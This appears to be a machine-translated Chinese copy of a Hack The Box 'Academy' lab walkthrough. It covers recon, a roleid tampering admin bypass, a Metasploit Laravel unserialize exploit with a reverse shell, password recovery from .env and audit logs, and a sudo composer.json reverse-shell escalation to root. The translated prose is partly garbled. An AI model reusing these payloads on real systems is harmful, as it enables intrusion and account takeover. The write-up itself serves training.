<html>
<head>
<title>[HTB] Academy — Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[HTB]学院奖-报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-academy-writeup-bdbd39d2f364?source=collection_archive---------1-----------------------#2021-02-28">https://infosecwriteups.com/htb-academy-writeup-bdbd39d2f364?source=collection_archive---------1-----------------------#2021-02-28</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/a7c93218f35e2a8f2c44ac01d64011dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/format:webp/1*yFpZfjPXdne2nwmhPSqmGw.png"/></div></figure><p id="019d" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这是一个简单的难度框，它涉及多个步骤来完全获得机器上的root访问权限。良好的学习途径:</p><ul class=""><li id="872c" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">Webapp上注册功能的访问控制旁路</li><li id="c7c2" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">RCE非序列化</li><li id="4c4b" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">Linux审计</li><li id="3166" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">作曲家权限提升</li></ul></div><div class="ab cl lj lk hx ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="im in io ip iq"><h1 id="b0ae" class="lq lr it bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated"><strong class="ak">初始侦察</strong></h1><h2 id="d9ad" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak"> Nmap </strong></h2><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="275b" class="mo lr it nf b gy nj nk l nl nm"><strong class="nf iu">$ nmap -Pn --open -p- -T4 -sV -sC 10.10.10.215</strong></span><span id="88cd" class="mo lr it nf b gy nn nk l nl nm">PORT      STATE SERVICE VERSION<br/>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br/>80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))<br/>|_http-server-header: Apache/2.4.41 (Ubuntu)<br/>|_http-title: Did not follow redirect to <a class="ae no" href="http://academy.htb/" rel="noopener ugc nofollow" target="_blank">http://academy.htb/</a><br/>33060/tcp open  mysqlx?<br/>| fingerprint-strings: <br/>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: <br/>|     Invalid message"<br/>|_    HY000</span></pre><ul class=""><li id="c9a3" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">HTTP (80/TCP) —根据Nmap结果，端口80将被重定向到<a class="ae no" href="http://academy.htb/" rel="noopener ugc nofollow" target="_blank">http://academy.htb/</a>。一旦我更新了/etc/hosts文件，我就可以访问下面的HTB学院网站:</li></ul><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nq nr di ns bf nt"><div class="gh gi np"><img src="../Images/520c14ff54a99a282c4041c7403aa660.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E8n3THneBrUx8cELNUNHFQ.png"/></div></div></figure><h2 id="e043" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak">网络目录枚举(Dirsearch) </strong></h2><p id="04ab" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">像往常一样，我运行了一个快速的目录搜索，看看我是否能列举出任何有趣的页面。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="8330" class="mo lr it nf b gy nj nk l nl nm"><strong class="nf iu">$ python3 dirsearch.py -u </strong><a class="ae no" href="http://academy.htb/" rel="noopener ugc nofollow" target="_blank"><strong class="nf iu">http://academy.htb/</strong></a><strong class="nf iu"> -e php,txt,html | grep 200</strong></span><span id="b306" class="mo lr it nf b gy nn nk l nl nm">[21:45:39] 200 -    3KB - /admin.php        &lt;-- Interesting                                       <br/>[21:46:05] 200 -    0B  - /config.php       &lt;-- Interesting                                                                      <br/>[21:46:21] 200 -    2KB - /index.php                                                                           <br/>[21:46:21] 200 -    2KB - /index.php/login/<br/>[21:46:26] 200 -    3KB - /login.php<br/>[21:46:43] 200 -    3KB - /register.php</span></pre><ul class=""><li id="b9c7" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">admin.php—这是另一个用于管理访问的登录页面</li><li id="528d" class="kv kw it jz b ka le ke lf ki lg km lh kq li ku la lb lc ld bi translated">config.php——这不是很有用</li></ul><h2 id="d7ee" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak">出入控制旁路(register.php)</strong></h2><p id="268b" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">使用下面的<code class="fe nz oa ob nf b">register.php</code>函数，我可以注册一个新用户:</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nq nr di ns bf nt"><div class="gh gi oc"><img src="../Images/1cc744434c05a8a57e367573bf2242dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hcixGPffv4oYu8sfhBNYqg.png"/></div></div></figure><p id="4529" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我使用创建的帐户登录时，我是作为<code class="fe nz oa ob nf b">egre55</code>用户帐户登录的。所有的功能不是不起作用就是静态页面。</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nq nr di ns bf nt"><div class="gh gi od"><img src="../Images/e8ccd0c72018ea6240dbcf5d18569f78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iiUZAZjdhyzwefp8Tw24mQ.png"/></div></div></figure><p id="26e8" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">接下来，我检查了注册过程的HTTP请求，发现了一些有趣的参数，名为<code class="fe nz oa ob nf b">&amp;roleid=0</code>。它当前配置为0，但如果我们将其更改为1，并查看我们是否可以注册一个管理员用户。</p><p id="b9a3" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><code class="fe nz oa ob nf b">&lt;b&gt;HTTP POST Request (register.php)&lt;/b&gt;</code></p><ul class=""><li id="9cc2" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">常规用户注册</li></ul><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="831d" class="mo lr it nf b gy nj nk l nl nm">POST /register.php HTTP/1.1<br/>Host: academy.htb<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 <a class="ae no" href="mailto:root@pzsidj86sntf4zemo64tivcs5jbc1ep3.burpcollaborator.net" rel="noopener ugc nofollow" target="_blank">root@pzsidj86sntf4zemo64tivcs5jbc1ep3.burpcollaborator.net</a><br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate</span><span id="c21c" class="mo lr it nf b gy nn nk l nl nm">...snip...</span><span id="57eb" class="mo lr it nf b gy nn nk l nl nm">uid=bigb0ss&amp;password=bigb0ss&amp;confirm=bigb0ss&amp;roleid=0</span></pre><ul class=""><li id="319c" class="kv kw it jz b ka kb ke kf ki kx km ky kq kz ku la lb lc ld bi translated">管理员用户注册</li></ul><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="519c" class="mo lr it nf b gy nj nk l nl nm">POST /register.php HTTP/1.1<br/>Host: academy.htb<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 <a class="ae no" href="mailto:root@pzsidj86sntf4zemo64tivcs5jbc1ep3.burpcollaborator.net" rel="noopener ugc nofollow" target="_blank">root@pzsidj86sntf4zemo64tivcs5jbc1ep3.burpcollaborator.net</a><br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate</span><span id="6298" class="mo lr it nf b gy nn nk l nl nm">...snip...</span><span id="8924" class="mo lr it nf b gy nn nk l nl nm">uid=bigb0ss_a&amp;password=bigb0ss&amp;confirm=bigb0ss&amp;roleid=1</span></pre><p id="71a9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">它成功地将我的下一个用户bigb0ss_a注册为管理员用户。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="9541" class="mo lr it nf b gy nj nk l nl nm">GET /success-page.php HTTP/1.1<br/>Host: academy.htb<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 <a class="ae no" href="mailto:root@pzsidj86sntf4zemo64tivcs5jbc1ep3.burpcollaborator.net" rel="noopener ugc nofollow" target="_blank">root@pzsidj86sntf4zemo64tivcs5jbc1ep3.burpcollaborator.net</a><br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate</span></pre><h2 id="43b3" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak">管理页面访问(admin.php)</strong></h2><p id="e035" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">通过用<code class="fe nz oa ob nf b">bigb0ss_a</code>登录，我可以登录到管理页面并发现<code class="fe nz oa ob nf b">dev-staging-01.academy.htb</code>的另一个子域</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nq nr di ns bf nt"><div class="gh gi oe"><img src="../Images/05734741d86ebdf8ac7f116474417f6d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2hC507R9C4gxWlNyuwe9Dg.png"/></div></div></figure><h2 id="5be1" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak">开发-暂存页面访问</strong></h2><p id="44d2" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">将<code class="fe nz oa ob nf b">dev-staging-01.academy.htb</code>域添加到<code class="fe nz oa ob nf b">/etc/hosts file</code>之后，我就可以访问这个网站了。</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nq nr di ns bf nt"><div class="gh gi od"><img src="../Images/11a5f6203c3c1a024afe299f2fffb7e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IGnyfNnNLZ8Mrd6p63OmVQ.png"/></div></div></figure></div><div class="ab cl lj lk hx ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="im in io ip iq"><h1 id="36a0" class="lq lr it bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated"><strong class="ak">最初的立足点</strong></h1><h2 id="4e56" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak">拉腊维尔令牌解除RCE的序列化</strong></h2><p id="6048" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">在这个网站上，有一些有趣的信息，如MySQL的信用和Laravel的APP_KEY信息。</p><figure class="na nb nc nd gt ju gh gi paragraph-image"><div class="gh gi of"><img src="../Images/fa1973387a5de204413f1f8457f8e98d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1304/format:webp/1*iHY8K4GfWPxjKDOdql46Ug.png"/></div></figure><p id="0e08" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">msfconsole有一个利用Laravel令牌非序列化攻击的POC。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="cc72" class="mo lr it nf b gy nj nk l nl nm">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; options</span><span id="76b8" class="mo lr it nf b gy nn nk l nl nm">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><span id="db64" class="mo lr it nf b gy nn nk l nl nm">Name       Current Setting                               Required  Description<br/>   ----       ---------------                               --------  -----------<br/>   APP_KEY    <strong class="nf iu">dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</strong>  no        The base64 encoded APP_KEY string from the .env file<br/>   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]<br/>   RHOSTS     <strong class="nf iu">10.10.10.215</strong>                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'<br/>   RPORT      <strong class="nf iu">80</strong>                                            yes       The target port (TCP)<br/>   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections<br/>   TARGETURI  /                                             yes       Path to target webapp<br/>   VHOST      <strong class="nf iu">dev-staging-01.academy.htb</strong>                                                    no        HTTP server virtual host</span><span id="652e" class="mo lr it nf b gy nn nk l nl nm">Payload options (cmd/unix/reverse_perl):</span><span id="53c8" class="mo lr it nf b gy nn nk l nl nm">Name   Current Setting  Required  Description<br/>   ----   ---------------  --------  -----------<br/>   LHOST  10.10.14.25      yes       The listen address (an interface may be specified)<br/>   LPORT  9001             yes       The listen port</span><span id="e4dd" class="mo lr it nf b gy nn nk l nl nm">Exploit target:</span><span id="a143" class="mo lr it nf b gy nn nk l nl nm">Id  Name<br/>   --  ----<br/>   0   Automatic</span></pre><p id="6457" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">它工作了，我能够访问到<code class="fe nz oa ob nf b">www-data</code>用户。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="3e14" class="mo lr it nf b gy nj nk l nl nm">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; run</span><span id="b6f3" class="mo lr it nf b gy nn nk l nl nm">[*] Started reverse TCP handler on 10.10.14.25:9001 <br/>[*] Command shell session 1 opened (10.10.14.25:9001 -&gt; 10.10.10.215:51848) at 2020-11-10 22:41:49 -0500</span><span id="bc0d" class="mo lr it nf b gy nn nk l nl nm"><strong class="nf iu">id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@academy:/var/www/html/htb-academy-dev-01/public$</strong></span></pre></div><div class="ab cl lj lk hx ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="im in io ip iq"><h1 id="5cce" class="lq lr it bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated"><strong class="ak">权限提升</strong></h1><p id="f98c" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">通过查看<code class="fe nz oa ob nf b">/etc/passwd</code>，我注意到这个框中有多个用户。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="52b0" class="mo lr it nf b gy nj nk l nl nm">$ cat /etc/passwd<br/>cat /etc/passwd<br/>root:x:0:0:root:/root:/bin/bash</span><span id="1203" class="mo lr it nf b gy nn nk l nl nm">...snip...</span><span id="f790" class="mo lr it nf b gy nn nk l nl nm">mrb3n:x:1001:1001::/home/mrb3n:/bin/sh<br/>cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh<br/>mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false<br/>21y4d:x:1003:1003::/home/21y4d:/bin/sh<br/>ch4p:x:1004:1004::/home/ch4p:/bin/sh<br/>g0blin:x:1005:1005::/home/g0blin:/bin/sh</span></pre><h2 id="36ce" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak">www-data→cry 011t 3(存储的凭证)</strong></h2><p id="f581" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">进一步的枚举发现了包含密码<code class="fe nz oa ob nf b">mySup3rP4s5w0rd!!</code>的文件<code class="fe nz oa ob nf b">.env</code>。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="f2d9" class="mo lr it nf b gy nj nk l nl nm">www-data@academy:/var/www/html/academy$ ls -la</span><span id="d6db" class="mo lr it nf b gy nn nk l nl nm">total 280<br/>drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .<br/>drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..<br/>-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env<br/>-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example<br/>-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes<br/>-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore<br/>drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app<br/>-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan<br/>drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap</span><span id="7220" class="mo lr it nf b gy nn nk l nl nm">...snip...</span><span id="657d" class="mo lr it nf b gy nn nk l nl nm">www-data@academy:/var/www/html/academy$ cat .env</span><span id="b0f6" class="mo lr it nf b gy nn nk l nl nm">APP_NAME=Laravel<br/>APP_ENV=local<br/>APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=<br/>APP_DEBUG=false<br/>APP_URL=<a class="ae no" href="http://localhost" rel="noopener ugc nofollow" target="_blank">http://localhost</a></span><span id="fee8" class="mo lr it nf b gy nn nk l nl nm">LOG_CHANNEL=stack</span><span id="449f" class="mo lr it nf b gy nn nk l nl nm">DB_CONNECTION=mysql<br/>DB_HOST=127.0.0.1<br/>DB_PORT=3306<br/>DB_DATABASE=academy<br/>DB_USERNAME=dev<br/><strong class="nf iu">DB_PASSWORD=mySup3rP4s5w0rd!!</strong></span><span id="516c" class="mo lr it nf b gy nn nk l nl nm">...snip...</span></pre><h2 id="3051" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated">user.txt</h2><p id="77ab" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">密码对用户帐户<code class="fe nz oa ob nf b">cry0l1t3</code>有效，我能够以这个用户的身份SSH到机器中并读取user.txt标志。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="d159" class="mo lr it nf b gy nj nk l nl nm">ssh cry0l1t3@10.10.10.215<br/>cry0l1t3@10.10.10.215's password: <br/>Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)</span><span id="3636" class="mo lr it nf b gy nn nk l nl nm">* Documentation:  <a class="ae no" href="https://help.ubuntu.com" rel="noopener ugc nofollow" target="_blank">https://help.ubuntu.com</a><br/> * Management:     <a class="ae no" href="https://landscape.canonical.com" rel="noopener ugc nofollow" target="_blank">https://landscape.canonical.com</a><br/> * Support:        <a class="ae no" href="https://ubuntu.com/advantage" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/advantage</a></span><span id="8d6b" class="mo lr it nf b gy nn nk l nl nm">System information as of Wed 11 Nov 2020 04:43:35 AM UTC</span><span id="026a" class="mo lr it nf b gy nn nk l nl nm">System load:             0.0<br/>  Usage of /:              44.4% of 15.68GB<br/>  Memory usage:            15%<br/>  Swap usage:              0%<br/>  Processes:               176<br/>  Users logged in:         0<br/>  IPv4 address for ens160: 10.10.10.215<br/>  IPv6 address for ens160: dead:beef::250:56ff:feb9:ca60</span><span id="6d3e" class="mo lr it nf b gy nn nk l nl nm">* Introducing self-healing high availability clustering for MicroK8s!<br/>   Super simple, hardened and opinionated Kubernetes for production.</span><span id="681d" class="mo lr it nf b gy nn nk l nl nm"><a class="ae no" href="https://microk8s.io/high-availability" rel="noopener ugc nofollow" target="_blank">https://microk8s.io/high-availability</a></span><span id="378f" class="mo lr it nf b gy nn nk l nl nm">0 updates can be installed immediately.<br/>0 of these updates are security updates.</span><span id="9d50" class="mo lr it nf b gy nn nk l nl nm">Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2<br/><strong class="nf iu">$ id<br/>uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)<br/>$ ls<br/>user.txt<br/>$ cat user.txt  <br/>b6f4**REDACTED**1bed</strong></span></pre><h2 id="4c75" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak"> cry0l1t3 → mrb3n (Linux审计)</strong></h2><p id="6737" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">更多的枚举发现，Linux审计文件在<code class="fe nz oa ob nf b">/var/log/audit</code>目录下。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="97a6" class="mo lr it nf b gy nj nk l nl nm">$ ls -la<br/>total 24748<br/>drwxr-x---  2 root adm       4096 Nov  9 10:11 .<br/>drwxrwxr-x 12 root syslog    4096 Nov 11 02:37 ..<br/>-rw-r-----  1 root adm     138988 Nov 11 05:12 audit.log<br/>-r--r-----  1 root adm    8388813 Nov  9 10:11 audit.log.1<br/>-r--r-----  1 root adm    8388720 Sep  4 03:45 audit.log.2<br/>-r--r-----  1 root adm    8388617 Aug 23 21:45 audit.log.3</span></pre><p id="4432" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">那些是当前用户<code class="fe nz oa ob nf b">cry0l1t3</code>所在的<code class="fe nz oa ob nf b">adm</code>组可读的。Linux审计文件本质上是Linux <code class="fe nz oa ob nf b">Syscalls</code>的日志。日志中的一些数据是十六进制格式的。进一步努力找出以下有趣的命令:</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="908c" class="mo lr it nf b gy nj nk l nl nm">$ cat audit.log.3 | grep "data"<br/>type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A<br/>type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A<br/>type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=77686F616D690A<br/>type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A<br/>type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A</span></pre><p id="8ad9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">通过使用一个简单的Python3命令，我可以将十六进制转换成文本值，并找到<code class="fe nz oa ob nf b">mrb3n</code>用户的密码:<code class="fe nz oa ob nf b">mrb3n_Ac@d3my!</code></p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="95d2" class="mo lr it nf b gy nj nk l nl nm">cry0l1t3@academy:/var/log/audit$ python3 -c 'import binascii; print(binascii.a2b_hex("7375206D7262336E0A"))'<br/><strong class="nf iu">b'su mrb3n\n'</strong></span><span id="29b3" class="mo lr it nf b gy nn nk l nl nm">cry0l1t3@academy:/var/log/audit$ python3 -c 'import binascii; print(binascii.a2b_hex("6D7262336E5F41634064336D79210A"))'<br/><strong class="nf iu">b'mrb3n_Ac@d3my!\n'</strong></span><span id="449c" class="mo lr it nf b gy nn nk l nl nm">cry0l1t3@academy:/var/log/audit$ python3 -c 'import binascii; print(binascii.a2b_hex("77686F616D690A"))'<br/>b'whoami\n'</span><span id="c0d8" class="mo lr it nf b gy nn nk l nl nm">cry0l1t3@academy:/var/log/audit$ python3 -c 'import binascii; print(binascii.a2b_hex("657869740A"))'<br/>b'exit\n'</span></pre><p id="5db6" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">获得用户访问权。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="426f" class="mo lr it nf b gy nj nk l nl nm">$ su mrb3n<br/>Password: <br/>$ id<br/>uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)<br/>$ bash -i<br/>mrb3n@academy:/var/log/audit$</span></pre><h2 id="938d" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated"><strong class="ak"> mrb3n → root(作曲者)</strong></h2><p id="a371" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated"><code class="fe nz oa ob nf b">sudo -l</code>命令显示<code class="fe nz oa ob nf b">mrb3n</code>用户可以使用root权限运行composer命令。</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="fb15" class="mo lr it nf b gy nj nk l nl nm">$ sudo -l<br/>[sudo] password for mrb3n: <br/>Matching Defaults entries for mrb3n on academy:<br/>    env_reset, mail_badpass,<br/>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><span id="0915" class="mo lr it nf b gy nn nk l nl nm">User mrb3n may run the following commands on academy:<br/>    (ALL) /usr/bin/composer</span></pre><p id="17b2" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">有多种方法可以利用<code class="fe nz oa ob nf b">composer</code>命令来提升权限。我为权限提升创建了以下<code class="fe nz oa ob nf b">composer.json</code>文件:</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="1cee" class="mo lr it nf b gy nj nk l nl nm">{<br/> "scripts": {<br/>   "post-install-cmd": [<br/>     "php -r '$sock=fsockopen(\"127.0.0.1\",9002);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'"<br/>   ],<br/>     "post-update-cmd": [<br/>       "php -r '$sock=fsockopen(\"127.0.0.1\",9002);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'"<br/>     ]<br/> }<br/>}</span></pre><h2 id="4b82" class="mo lr it bd ls mp mq dn lw mr ms dp ma ki mt mu me km mv mw mi kq mx my mm mz bi translated">root.txt</h2><p id="f719" class="pw-post-body-paragraph jx jy it jz b ka nu kc kd ke nv kg kh ki nw kk kl km nx ko kp kq ny ks kt ku im bi translated">通过运行以下命令，我能够获得root访问权限:</p><pre class="na nb nc nd gt ne nf ng nh aw ni bi"><span id="e817" class="mo lr it nf b gy nj nk l nl nm"><strong class="nf iu">$ sudo /usr/bin/composer install</strong><br/>PHP Warning:  PHP Startup: Unable to load dynamic library</span><span id="3e40" class="mo lr it nf b gy nn nk l nl nm">...snip...</span><span id="2907" class="mo lr it nf b gy nn nk l nl nm">PHP Warning:  fsockopen(): unable to connect to 127.0.0.1:9002 (Connection refused) in Command line code on line 1<br/><strong class="nf iu">root@academy:/home/mrb3n# id<br/>uid=0(root) gid=0(root) groups=0(root)<br/>root@academy:/home/mrb3n# cat /root/root.txt <br/>ceb8**REDACTED**3252</strong></span></pre><p id="63b9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">感谢阅读！</p></div></div>    
</body>
</html>